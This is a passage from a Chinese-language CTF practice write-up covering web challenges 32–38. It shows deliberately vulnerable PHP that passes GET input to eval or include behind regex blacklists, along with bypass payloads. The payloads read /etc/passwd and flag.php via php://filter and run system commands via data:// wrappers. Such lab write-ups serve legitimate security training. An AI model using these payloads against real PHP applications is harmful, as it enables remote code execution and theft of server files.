h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123; <span class="comment">//过滤了更多符号，空格也被过滤了，不过可以用url编码进行绕过</span></span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220808233737167.png" alt="" style="zoom: 67%;" /><p>因为过滤了括号和分号，我们就用不需要括号的函数来做，用include()函数，<code>?c=include$_GET[1]%0a?&gt;&amp;1=/etc/passwd</code>   测试，文件包含成功   还可以测试能不能包含二进制文件    <code>?c=include$_GET[1]%0a?&gt;&amp;1=/bin/ls</code></p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220808234125543.png" alt="" style="zoom: 67%;" /><p><code>?c=include$_GET[1]%0a?&gt;&amp;1=flag.php</code>      因为include函数只包含flag.php变量，并不能进行输出，前面禁用了分号，造成没有分割，无法进行输出   我们需要用到伪协议进行任意文件读取，通过指定的一个base64通道读取文件，不通过base64编码是看不到文件的</p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220808234903200.png" alt="" style="zoom: 67%;" /><p><code>?c=include$_GET[1]%0a?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</code></p><p>进行解码</p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220808235058401.png" alt="" style="zoom:67%;" /><h3 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 02:22:27</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>同32一样，<code>?c=include%0a$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</code></p><p>还有一种方法，用require()函数</p><p><code>?c=require%0a$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</code></p><h3 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h3><p>同理32     <code>?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</code></p><h3 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 04:21:23</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>同理32     <code>?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</code></p><h3 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 04:21:16</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>这里把0-9过滤掉了，肯定不能再用1进行传参，我们可以换成字母进行，换成x    </p><p>   <code>?c=include$_GET[x]?&gt;&amp;x=php://filter/convert.base64-encode/resource=flag.php</code></p><h3 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 05:18:55</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;       <span class="comment">//文件包含获取到的变量c的值，但是对变量c又有过滤，要求获取到的c中不包含flag</span></span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);   <span class="comment">//这个函数只能包含数据，但是不能进行代码执行，所以我们要用data伪协议，可以让data协议后的数据进行代码执行</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220809222608741.png" alt="" style="zoom: 50%;" /><p><code>?c=data://text/plain,&lt;?php system(&#39;ls&#39;);?&gt;</code>      用data伪协议可以查看到当前目录，那就进行读取flag，因为过滤掉了flag，所以我们用星号代替f以后的字符，因为目录下面只有f开头的这一个文件</p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220809223516473.png"></p><h3 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 05:23:36</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|php|file/i&quot;</span>, <span class="variable">$c</span>))&#123;    <span class="comment">//多过滤了PHP，file </span></span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以我们在构造payload的时候，要绕过flag   PHP和file   <code>?c=data://text/plain,&lt;?= system(&quot;tac fla*&quot;);?&gt;</code>     用短标签&#x3D;代替PHP</p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220814134053418.png" alt="" style="zoom:50%;" />]]></content>
      
      
      <categories>
          
          <category> 刷题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 刷题 </tag>
            
            <tag> 萌新 </tag>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
